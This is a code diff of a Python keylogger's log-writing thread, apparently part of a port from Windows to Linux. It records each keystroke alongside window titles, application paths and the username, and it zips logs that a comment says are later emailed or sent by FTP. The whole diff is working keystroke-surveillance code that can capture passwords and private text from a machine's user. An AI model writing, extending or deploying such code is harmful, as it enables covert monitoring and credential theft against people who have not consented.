@@ -20,8 +20,14 @@
 ##
 ##############################################################################
 
-import win32api, win32con, win32process
 import os, os.path
+if os.name == 'posix':
+	pass
+elif os.name == 'nt':
+	import win32api, win32con, win32process
+else:
+	print "OS is not recognised as windows or linux"
+	exit()
 import time
 import re
 import sys
@@ -76,7 +82,7 @@ class LogWriter(threading.Thread):
 		self.settings = settings
 		self.cmdoptions = cmdoptions
 		
-		self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")	  #regexp filter for the non-allowed characters in windows filenames.
+		self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")    #regexp filter for the non-allowed characters in windows filenames.
 		
 		self.createLogger()
 		#self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
@@ -167,8 +173,6 @@ class LogWriter(threading.Thread):
 		## line format:
 		## date; time (1 minute resolution); fullapppath; hwnd; username; window title; eventdata
 		##
-		## if we are logging keystroke count, that field becomes the penultimate field. 
-		##
 		## event data: ascii if normal key, escaped if "special" key, escaped if csv separator
 		## self.processName = self.GetProcessNameFromHwnd(event.Window) #fullapppath
 		## hwnd = event.Window
@@ -183,14 +187,11 @@ class LogWriter(threading.Thread):
 		#self.stopflag=False
 		self.eventlist = range(7) #initialize our eventlist to something.
 		
-		if self.settings['General']['Log Key Count'] == True:
-			self.eventlist.append(7)
-		
 		while not self.finished.isSet():
 			try:
 				event = self.q.get()
-				
-				loggable = self.TestForNoLog(event)	 # see if the program is in the no-log list.
+				print event
+				loggable = self.TestForNoLog(event)  # see if the program is in the no-log list.
 				if not loggable:
 					if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
 					continue
@@ -202,28 +203,23 @@ class LogWriter(threading.Thread):
 				
 				eventlisttmp = [time.strftime('%Y%m%d'), 
 								time.strftime('%H%M'), 
-								self.GetProcessNameFromHwnd(event.Window), 
+								self.GetProcessNameFromHwnd(event), 
 								str(event.Window), 
 								os.getenv('USERNAME'), 
-								str(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]')]
-								
-				if self.settings['General']['Log Key Count'] == True:
-					eventlisttmp = eventlisttmp + ['1',unicode(self.ParseEventValue(event), 'latin-1')]
-				else:
-					eventlisttmp.append(unicode(self.ParseEventValue(event), 'latin-1'))
-					
-				if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or len(self.eventlist[-1]) < self.settings['General']['Limit Keylog Field Size']):
-					self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1]) #append char to log
-					if self.settings['General']['Log Key Count'] == True:
-						self.eventlist[-2] = str(int(self.eventlist[-2]) + 1) # increase stroke count
+								str(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), 
+								unicode(self.ParseEventValue(event), 'latin-1')]
+				if self.eventlist[:-1] == eventlisttmp[:-1]:
+					self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1])
 				else:
 					self.WriteToLogFile() #write the eventlist to file, unless it's just the dummy list
 					self.eventlist = eventlisttmp
 			## don't need this with infinite timeout?
 			except Queue.Empty:
+				print "queue empty"
 				self.PrintDebug("\nempty queue...\n")
 				pass #let's keep iterating
 			except:
+				print "some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info()
 				self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
 				pass #let's keep iterating
 		
@@ -233,39 +229,34 @@ class LogWriter(threading.Thread):
 		'''Pass the event ascii value through the requisite filters.
 		Returns the result as a string.
 		'''
-		npchrstr = self.settings['General']['Non-printing Character Representation']
-		npchrstr = re.sub('%keyname%', str(event.Key), npchrstr)
-		npchrstr = re.sub('%scancode%', str(event.ScanCode), npchrstr)
-		npchrstr = re.sub('%vkcode%', str(event.KeyID), npchrstr)
-		
 		if chr(event.Ascii) == self.settings['General']['Log File Field Separator']:
-			return(npchrstr)
+			return('[sep_key]')
 		
-		#translate backspace into text string, if option is set.
-		if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
-			return(npchrstr)
-		
-		#translate escape into text string, if option is set.
-		if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
-			return(npchrstr)
+		if os.name == 'nt':
+			#translate backspace into text string, if option is set.
+			if event.Ascii == 8 and self.settings['General']['Parse Backspace'] == True:
+				return('[KeyName:' + event.Key + ']')
+			
+			#translate escape into text string, if option is set.
+			if event.Ascii == 27 and self.settings['General']['Parse Escape'] == True:
+				return('[KeyName:' + event.Key + ']')
 
-		# need to parse the returns, so as not to break up the delimited data lines
-		if event.Ascii == 13:
-			return(npchrstr)
-		
+			# need to parse the returns, so as not to break up the delimited data lines
+			if event.Ascii == 13:
+				return('[KeyName:' + event.Key + ']')
+			
 		#we translate all the special keys, such as arrows, backspace, into text strings for logging
 		#exclude shift keys, because they are already represented (as capital letters/symbols)
 		if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
-			#return('[KeyName:' + event.Key + ']')
-			return(npchrstr)
-		
+			return('[KeyName:' + event.Key + ']')
+			
 		return(chr(event.Ascii))
 		
 	def WriteToLogFile(self):
 		'''Write the latest eventlist to logfile in one delimited line
 		'''
 		
-		if self.eventlist[:7] != range(7):
+		if self.eventlist != range(7):
 			try:
 				line = unicode(self.settings['General']['Log File Field Separator'],'latin-1').join(self.eventlist) + "\n"
 				self.PrintStuff(line)
@@ -278,10 +269,10 @@ class LogWriter(threading.Thread):
 		'''This function returns False if the process name associated with an event
 		is listed in the noLog option, and True otherwise.'''
 		
-		self.processName = self.GetProcessNameFromHwnd(event.Window)
+		self.processName = self.GetProcessNameFromHwnd(event)
 		if self.settings['General']['Applications Not Logged'] != 'None':
 			for path in self.settings['General']['Applications Not Logged'].split(';'):
-				if os.stat(path) == os.stat(self.processName):	#we use os.stat instead of comparing strings due to multiple possible representations of a path
+				if os.stat(path) == os.stat(self.processName):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
 					return False
 		return True
 
@@ -314,7 +305,10 @@ class LogWriter(threading.Thread):
 			for fname in files:
 				#if fname != self.settings['ziparchivename']:
 				if not self.CheckIfZipFile(fname):
-					myzip.write(os.path.join(root,fname).split("\\",1)[1])
+					if os.name == 'nt':
+						myzip.write(os.path.join(root,fname).split("\\",1)[1])
+					elif os.name == 'posix':
+						myzip.write(os.path.join(root,fname).split("/",1)[1])
 		
 		myzip.close()
 		myzip = zipfile.ZipFile(zipFileName, "r", zipfile.ZIP_DEFLATED)
@@ -322,15 +316,17 @@ class LogWriter(threading.Thread):
 			self.PrintDebug("Warning: Zipfile did not pass check.\n")
 		myzip.close()
 		
+		# chdir back
+		os.chdir(originalDir)
+		
+		
 		# write the name of the last completed zip file
 		# so that we can check against this when emailing or ftping, to make sure
 		# we do not try to transfer a zipfile which is in the process of being created
+		
 		ziplog=open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'w')
 		ziplog.write(zipFileName)
 		ziplog.close()
-		
-		# chdir back
-		os.chdir(originalDir)
 		
 		#now we can delete all the logs that have not been modified since we made the zip. 
 		self.DeleteOldLogs(zipFileRawTime)
@@ -547,7 +543,7 @@ class LogWriter(threading.Thread):
 				elif type(lastmodcutoff) == float:
 					testvalue = os.path.getmtime(os.path.join(root,fname)) < lastmodcutoff
 				
-				if fname == "emaillog.txt" or fname == "ziplog.txt":
+				if fname == "emaillog.txt" or fname == "ziplog.txt" or fname == self.settings['General']['Log File']:
 					testvalue = False # we don't want to delete these
 				
 				if type(lastmodcutoff) == float and self.CheckIfZipFile(fname):
@@ -563,16 +559,20 @@ class LogWriter(threading.Thread):
 					except:
 						self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
 
-	def GetProcessNameFromHwnd(self, hwnd):
+	def GetProcessNameFromHwnd(self, event):
 		'''Acquire the process name from the window handle for use in the log filename.
 		'''
-		threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
-		
-		# PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
-		
-		mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
-		procname = win32process.GetModuleFileNameEx(mypyproc, 0)
-		return procname
+		if os.name == 'nt':
+			hwnd = event.Window
+			threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
+			
+			# PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
+			
+			mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
+			procname = win32process.GetModuleFileNameEx(mypyproc, 0)
+			return procname
+		elif os.name == 'posix':
+			return str(event.WindowProcName)
 
 	def cancel(self):
 		'''To exit cleanly, flush all write buffers, and stop all running timers.
